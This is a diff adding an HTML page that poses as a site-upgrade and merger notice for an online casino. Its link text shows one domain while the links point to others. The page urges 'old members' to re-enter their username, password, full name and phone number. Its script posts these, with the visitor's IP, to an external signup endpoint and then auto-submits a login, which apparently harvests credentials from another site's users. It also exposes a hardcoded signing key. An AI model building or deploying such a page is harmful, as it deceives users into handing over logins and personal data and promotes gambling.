@@ -1,0 +1,596 @@
+<html><head>
+	<meta charset="utf-8">
+	<title>平台合并公告</title>
+	<link rel="stylesheet" href="/html/front/dafa/pc/da.css">
+    <script type="text/javascript" src="/html/front/dafa/pc/jquery-3.2.0.min.js"></script>
+	
+    <script>
+        (function (){
+            if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
+                window.location.href = "./index_m.html";
+            }
+            return;
+        })()
+
+    </script>
+
+	<script src="./html/js/config.js"> </script>
+    <script src="https://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script src="./html/front/dafa/pc/md5.js"></script>
+	<script>
+		var global_ip = returnCitySN.cip;
+		var global_city = returnCitySN.name;
+	</script>
+
+</head>
+<body>
+    <div class="parent">
+		<div class="hebing">
+			<div class="hebingct">
+				<img src="/html/front/dafa/pc/logo.png" class="hebinglogo">
+				<div class="hebingtitle">网站升级公告</div>
+				<div class="hebingtxt">
+					<p>全站通知：</p>
+					<p>尊敬的会员您好，为了给每一位玩家有更高的游戏体验和资金保障，我司即日起将对网站全面升级，永久网址即日起修改成： <a href="http://df5aa.com" target="_blank">df5.com</a>  现将自动切换到大发娱乐城 <a href="http://df5dd.com" target="_blank">df5.com</a>  ，老会员填写相关信息资料即可<span> 将原网站相关数据完整转移 </span>，数据转移在注册成功5分钟内即可完成，若没有及时转移，请联系我司在线客服进行转移即可，<b>站点升级将搭配实体赌场客服精英团队，24小时为您服务，全新存取5分钟便捷通道，更有返水双响炮，每日存送100%限时开启等您挑战！</b> 永久网址：大发娱乐城<a href="http://df5aa.com" target="_blank"> DF5.COM。</a></p>
+					<div class="hebingbtnw">
+						<a class="zyzcbtn zybtn ml0">老玩家登录转移账号</a>
+						<a class="zyzcbtn zcbtn">新玩家注册送豪礼</a>
+						<div style="clear:both;"></div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	<div class="parent_zyzcw" style="height: 773px;">
+		<div class="zyzcw">
+            <span class="close_login_box"></span>
+			<div class="zyorzc" id="zyw">
+				<div class="stepline">
+					<div class="line"></div>
+					<div class="linetxt1 linetxt">登录会员账号</div><div class="linetxt2 linetxt">核对账号信息</div><div class="linetxt3 linetxt">申请提交成功</div>
+					<span class="linenum linenum1 lineg"></span><span class="linenum linenum2"></span><span class="linenum linenum3"></span>
+                </div>
+                
+                <div class="infow" style="margin-top:30px;">
+                   
+                        <div class="step1 zystep">
+                            <form action="https://www.df5dd.com/apidaf/login" method="POST" id="form_one">
+                            <div class="step1info">
+                                <input class="ipt account" name="username" id="zy_account" type="text" placeholder="请输入会员帐号">
+                                <input class="ipt loginpwd" name="password" id="zy_loginpwd" type="password" placeholder="请输入密码">
+
+                                <input type="hidden" name="client_ip">
+                                <input type="hidden" name="time">
+                                <input type="hidden" name="r">
+                                <input type="hidden" name="sign">
+
+                                <div class="step1btn">确认登入</div>
+                                <div class="step1des">如您是新玩家,点击这里 <span class="zcbtn">注册</span></div>
+                            </div>
+                            </form>
+                            <!-- <img class='step1bg' src='/html/front/dafa/pc/step1bg.png'/> -->
+                            <div style="clear:both;"></div>
+                            <img class="gotostep0" src="/html/front/dafa/pc/close.png">
+                        </div>
+                        <div class="step2 zystep">
+                            <div class="step2info">
+                                <div class="resetusernamew2" style="display:none;">
+                                    <div class="resetusername">
+                                        <input id="newusername2" style="float:left;" class="ipt account" placeholder="请输入新的用户名">
+                                        <span style="float:left;display:block;height:42px;line-height:42px;margin-left:10px;font-size:16px;color:#fff;">(相同用户名已转移,请重新输入一个用户名)</span>
+                                        <div style="clear:both;"></div>
+                                    </div>
+                                </div>
+                                <div class="step2infol">
+                                    <!-- <input class='ipt iconemail' id='zy_url' type='text' placeholder='请输入邮箱'/> -->
+									<!-- <input class='ipt moneypwd' id='zy_moneypwd' type='password' placeholder='请核对取款密码'/> -->
+                                    <input class="ipt loginpwd" id="zy_loginpwd2" type="password" placeholder="请核对登入密码">
+                                    <input class="ipt fullname" id="zy_fullname" type="text" placeholder="请核对您的姓名">
+                                    <input class="ipt icontel" id="zy_tel" type="text" placeholder="请输入可联系的手机号">
+                                </div>
+                                <!-- <div class='step2infor'> -->
+                                    
+                                    <!-- <input class='ipt address' id='zy_address' type='text' placeholder='请输入常登录地区'/> -->
+                                <!-- </div> -->
+                                <div style="clear:both;"></div>
+                            </div>
+                            <div class="twobtn">
+                                <div class="step2btn" style="float:none;">转移账户</div>
+                                <!--<div class='return'>返回</div>-->
+                                <div style="clear:both;"></div>
+                            </div>
+                        </div>
+                        <div class="step3 zystep">
+                            <div class="step3info">
+                                <div class="resetusernamew">
+                                    <p>相同用户名 已转移,请您 重置您的用户名 或 联系客服 给您重置</p>
+                                    <div class="resetusername">
+                                        <input id="newusername" class="ipt account" placeholder="请输入新的用户名">
+                                        <a class="resetusernamebtn">重置用户名</a>
+                                        <div style="clear:both;"></div>
+                                    </div>
+                                </div>
+                                <!--
+                                <p>申请编码</p>
+                                <p id='itime' class='code'></p>
+                                <p>发送申请编码至在线客服查询业务进度</p>
+                                -->
+                                <p>感谢您对我司的支持,您的账号已成功转移至 <a style="color:yellow" href="/login">df5aa.com</a>(大发), 如您原账号还有剩余金额, 请联系在线客服 进行审核资金转移业务</p>
+                            </div>
+                            <div class="step3btnw">
+                                <a class="step3btnl gotoplaturl">继续访问</a>
+                                <a href="http://messenger.providesupport.net/messenger/0n85uxjbaohmd0jxx7v4ctrkq8.html" target="_blank">在线客服</a>
+                                <div style="clear:both;"></div>
+                            </div>
+                        </div>
+                    
+                </div>
+                 
+			</div>
+			<div class="zyorzc" id="zcw">
+                <span class="close_reg_box"></span>
+				<div class="regstep regstep1">
+					<div class="regtitle">创建帐户</div>
+					<div class="infow success_reg">
+						<div class="reginfo">
+							<div class="reginfol">
+								<div class="iptw">
+									<input class="ipt account" id="zc_account" type="text" placeholder="请输入会员帐号">
+									<div class="tips"><span>6到10个字符,只能使用小写字母和数字</span><img class="xsj" src="/html/front/dafa/pc/xsj.png"></div>
+								</div>
+								
+								<div class="iptw">
+                                    <input class="ipt loginpwd" id="zc_loginpwd" type="password" placeholder="请输入登入密码">
+                                    <div class="tips"><span>6到20个字符,仅能使用字母和数字</span><img class="xsj" src="/html/front/dafa/pc/xsj.png"></div>
+                                </div>
+
+								<div class="iptw">
+									<input class="ipt fullname" id="zc_fullname" type="text" placeholder="请输入中文全名">
+									<div class="tips"><span>必须与您的银行账户名称相同,否则不能出款</span><img class="xsj" src="/html/front/dafa/pc/xsj.png"></div>
+                                </div>
+                                
+                                
+                                
+                                <div class="iptw">
+                                    <input class="ipt icontel" id="zc_tel" type="text" placeholder="请输入您的手机号">
+                                    <div class="tips"><span>11位手机号码</span><img class="xsj" src="/html/front/dafa/pc/xsj.png"></div>
+                                </div>
+							</div>
+							
+							<div style="clear:both;"></div>
+						 
+						<div class="twobtn">
+							<div class="regbtn">创建账户</div>
+							<!-- <div class='returnHome'>返回</div> -->
+							<div style="clear:both;"></div>
+						</div>
+					</div>
+				</div>
+				
+				<div class="regstep regstep2">
+					<div class="regtitle">恭喜您, 注册成功</div>
+					<div class="infow">
+						<div class="lasturl">最新网址: <a target="_blank" href="/login">www.df5dd.com</a></div>
+						<div class="twobtn">
+							<div data-url="" data-title="" id="AddToFavorite" class="scgw">加入收藏</div>
+							<a class="scgw come_in_web">进入官网</a>
+						</div>
+					</div>
+					<a href="/" class="hrefhome"><img src="/html/front/dafa/pc/close.png"></a>
+				</div>
+			</div>
+		</div>
+	</div>	
+		
+	<script type="text/javascript">
+
+	$(document).ready(function(){
+		
+		wh = $(document).height() > $(window).height() ? $(document).height() : $(window).height();
+		$('.parent_zyzcw').height(wh);
+		$(window).resize(function() {
+			wh = $(document).height() > $(window).height() ? $(document).height() : $(window).height();
+			$('.parent_zyzcw').height(wh);
+		});
+		
+		$("input").focus(function(){
+			$(this).css("background-color","#FFFFCC");
+		}).blur(function(){
+			$(this).css("background-color","#fff");
+		});
+
+		$("#zcw input").focus(function(){
+			$('.tips').hide();
+			$(this).parent().find('.tips').show();
+		}).blur(function(){
+			$('.tips').hide();
+		});
+		
+		$(".zybtn").click(function(){
+			$('.zyorzc').hide();
+			$('.parent_zyzcw').show();
+			$('#zyw .ipt').val('');
+			$('#zyw').show();
+		});
+		
+		$(".zcbtn").click(function(){
+			$('.zyorzc').hide();
+			$('.parent_zyzcw').show();
+			$('#zcw .ipt').val('');
+			$('#zcw').show();
+		});
+		
+		$('.step1btn').click(function(){
+			account = $("#zy_account").val();
+			loginpwd = $("#zy_loginpwd").val();
+			if(!account || !loginpwd) {
+				alert('请输入 会员帐号 和 密码');
+				return;
+			}
+			$('.zystep').hide();
+			$('.linenum2').addClass('lineg');
+			$('.step2').show();
+		});
+		
+		$('.return').click(function(){
+			$('.zystep').hide();
+			$('.linenum2').removeClass('lineg');
+			$('.step1').show();
+		});
+		
+		$('.returnHome').click(function(){
+			$('.parent_zyzcw').hide();
+			$('#zcw').hide();
+		});
+		
+		$('.gotostep0').click(function(){
+			$('.parent_zyzcw').hide();
+			$('#zyw').hide();
+		});
+		
+        
+        function resolve_info(value){
+
+			if(value == 'Err1001'){
+				return '签名错误'
+			}
+			else if(value == 'Err1002'){
+				return '时间愈时'
+			}
+			else if(value == 'Err1003'){
+				return '参数错误'
+			}
+			else if(value == 'Err1004'){
+				return '用户验证密码错误，请重新登入'
+			}
+			else if(value == 'Err1005'){
+				return '查无此用户或账号密码错误'
+			}
+			else if(value == 'Err1006'){
+				return '用户IP为空或格式错误'
+			}
+			else if(value == 'Err1011'){
+				return '用户名为空或格式错误'
+			}
+			else if(value == 'Err1012'){
+				return '用户名重复'
+			}
+			else if(value == 'Err1013'){
+				return '密码与确认密码为空值或格式错误'
+			}
+			else if(value == 'Err1014'){
+				return '提款密码格式错误'
+			}
+			else if(value == 'Err1015'){
+				return '用户姓名错误'
+			}
+			else if(value == 'Err1016'){
+				return '用户姓名重复'
+			}
+			else if(value == 'Err1017'){
+				return 'QQ号码格式错误'
+			}
+			else if(value == 'Err1018'){
+				return '电子邮件为空或格式错误'
+			}
+			else if(value == 'Err1019'){
+				return '电子邮件重复'
+			}
+			else if(value == 'Err1020'){
+				return '联系电话为空或格式错误'
+			}
+			else if(value == 'Err1021'){
+				return '联系电话重复'
+			}
+			else if(value == 'Err1022'){
+				return '生日格式错误'
+			}
+			else if(value == 'Err1023'){
+				return '代理广推码格式错误'
+			}
+			else if(value == 'Err1024'){
+				return '此广推码无效'
+			}
+			else if(value == 'Err1025'){
+				return '微信号格式错误'
+			}
+			else if(value == 'Err1026'){
+				return '性别格式错误'
+			}
+			else if(value == 'Err9999'){
+				return '注册失败，请联络客服'
+			}
+		}
+
+
+		//转移提交
+		var zyhadclicked = false;
+		$('.step2btn').click(function(){
+			if(zyhadclicked) {
+				return false;
+            }
+
+            var account = $("#zy_account").val();
+			var loginpwd = $("#zy_loginpwd").val();
+            var loginpwd2 = $("#zy_loginpwd2").val();
+            
+            if(loginpwd != loginpwd2){
+                alert('两次输入密码不一致');
+                return;
+            }
+			
+			var tel = $("#zy_tel").val();
+			var fullname = $("#zy_fullname").val();
+            var upline = global_upline;
+            var time = new Date().getTime();
+            var r = 'json';
+            var login_r = "";
+            var md5_key = "1GyFq8M7";
+            var email = "";
+			var sign = md5( time + account + loginpwd + fullname + email + tel + upline + r + md5_key);
+			
+			var login_sign = md5( time + account + loginpwd + login_r + md5_key);
+			$('#form_one').attr('action', request_login_url);
+			
+
+			
+			if(!fullname){
+				alert('请输入你的姓名')
+				return;
+			}
+
+			if(!tel){
+				alert('请输入手机号码')
+				return;
+			}
+
+			
+
+			function submit_input(){
+				//提交表单
+				$('input[name=username]').val(account);
+				$('input[name=password]').val(loginpwd);
+				$('input[name=client_ip]').val(global_ip);
+				$('input[name=r]').val("");
+				$('input[name=time]').val(time);
+				$('input[name=sign]').val(login_sign);
+				$('#form_one').submit();
+			}
+			
+            zyhadclicked = true;
+            $.post("https://www.df5dd.com/apidaf/signup",
+            
+             {  
+                username:account,
+                password:loginpwd,
+                withdrawcode:"",
+                fullname: fullname,
+                qq : "",
+                email:"",
+                tel:tel,
+                upline:upline,
+                client_ip:global_ip,
+                time: time,
+                r: r,
+                sign:sign
+                }, 
+                function(result){ 
+                    if(result[0]){
+                        
+                        $('.zystep').hide();
+                        $('.linenum3').addClass('lineg');
+						$('.step3').show();
+						
+                        alert('转移成功')
+                        // 提交表单
+						
+						$('.step3btnl').on('click',function(){
+							submit_input();
+						})
+
+						setTimeout(function(){
+							submit_input();
+						},10000)
+                        
+                    }else{
+                        var msg = resolve_info(result[1]);
+                        alert(msg);
+                    }
+				zyhadclicked = false;
+			});
+		});
+		
+		
+		//注册提交
+		var zchadclicked = false;
+		$('.regbtn').click(function(){
+			if(zchadclicked) {
+				return false;
+            }
+            
+
+		
+			var account = $("#zc_account").val();
+			var fullname = $("#zc_fullname").val();
+			var loginpwd = $("#zc_loginpwd").val();
+			
+            var tel = $("#zc_tel").val();
+            var email = "";
+            var qq = "";
+            var upline = global_upline;
+            var time = new Date().getTime();
+            var r = 'json';
+            var login_r = "";
+            var md5_key = "1GyFq8M7";
+            var email = "";
+            var sign = md5( time + account + loginpwd + fullname + email + tel + upline + r + md5_key);
+            var login_r = "";
+			var login_sign = md5( time + account + loginpwd + login_r + md5_key)
+
+			if(!account){
+				alert('请输入用户名');
+				return;
+			}
+
+			if(!loginpwd){
+				alert('请输入登录密码');
+				return;
+			}
+
+			if(!fullname){
+				alert('请输入你的姓名');
+				return;
+			}
+
+			if(!tel){
+				alert('请输入手机号码');
+				return;
+			}
+
+			$('#form_one').attr('action', request_login_url)
+			zchadclicked = true;
+			function bubmit_input_reg(){
+				//提交表单
+				$('input[name=username]').val(account);
+				$('input[name=password]').val(loginpwd);
+				$('input[name=client_ip]').val(global_ip);
+				$('input[name=r]').val("");
+				$('input[name=time]').val(time);
+				$('input[name=sign]').val(login_sign);
+				$('#form_one').submit();
+			}
+
+            $.post("https://www.df5dd.com/apidaf/signup",
+           {  
+            username:account,
+            password:loginpwd,
+            withdrawcode:"",
+            fullname: fullname,
+            qq : "",
+            email:"",
+            tel:tel,
+            upline:upline,
+            client_ip:global_ip,
+            time: time,
+            r: r,
+            sign:sign
+            }
+            , 
+            
+            function(result){ 
+				if(result[0]) {
+				
+					$('.success_reg').hide();
+					$('.regstep2').show();
+					
+					alert('注册成功')
+					
+					$('.come_in_web').on('click',function(){
+						bubmit_input_reg();
+					})
+
+					setTimeout(function(){
+						bubmit_input_reg();
+					},5000)
+					
+
+				} else {
+					var msg = resolve_info(result[1]);
+                    alert(msg);
+				}
+				zchadclicked = false;
+			},'json');
+		});
+        
+        $('.close_reg_box, .close_login_box').on('click',function(){
+			$('.parent_zyzcw').hide();
+			$('.step2').hide();
+			$('.step1').show();
+			$('.linenum2 ').removeClass('lineg');
+        })
+		
+		$('#AddToFavorite').click(function() {
+			url = $('#AddToFavorite').attr('data-url');
+			title = $('#AddToFavorite').attr('data-title');
+			AddToFavorite(url, title);
+		});
+		
+		
+		//重置用户名
+		var rstunhadclicked = false;
+		$('.resetusernamebtn').click(function() {
+			if(rstunhadclicked) {
+				return false;
+			}
+			rstunhadclicked = true;
+			var newusername = $('#newusername').val();
+			$.post("/resets/username",{newusername:newusername}, function(result){ 
+				if(result.state) {//重置成功
+					//$('.gotoplaturl').attr('href','/login/zyn');//更改 继续访问 按钮的网址 为 /login/zyn
+					$('.resetusernamew').html(result.msg);//重置成功,您的用户名已经重置为 aaaa
+				} else {//重置失败. 可能是 用户名还是重复. 可能是其它错误
+					resetusername = result.result.resetusername;
+					if(resetusername) {//用户名还是重复
+						alert(result.msg);
+					} else {//其他错误,比如 可能手机号重复. 您好,您的新用户名已记录,请联系客服查询业务进度.
+						$('.resetusernamew').hide();
+						alert(result.msg);
+					}
+					
+				}
+				rstunhadclicked = false;
+			},'json');
+		});
+		
+
+		
+		
+	});
+
+	
+	var AddToFavorite = function(url, title) {
+		var ua=navigator.userAgent.toLowerCase();
+		if(ua.indexOf("msie 8")>-1) {
+			external.AddToFavoritesBar(url, title, '');
+		} else {
+			try {
+				window.external.addFavorite(url, title);
+			} catch(e) {
+				try {
+					window.sidebar.addPanel(title, url, '');
+				} catch(e) {
+					alert("请按 Ctrl+D 进行收藏");
+				}
+			}
+		}
+		return false;
+	}
+		
+		
+	</script>
+  <div style="display: none">
+<script src="https://s19.cnzz.com/z_stat.php?id=1273679852&amp;web_id=1273679852" language="JavaScript"></script><script src="https://c.cnzz.com/core.php?web_id=1273679852&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1273679852" target="_blank" title="站长统计">站长统计</a>
+    </div>	
+
+</div></body></html>
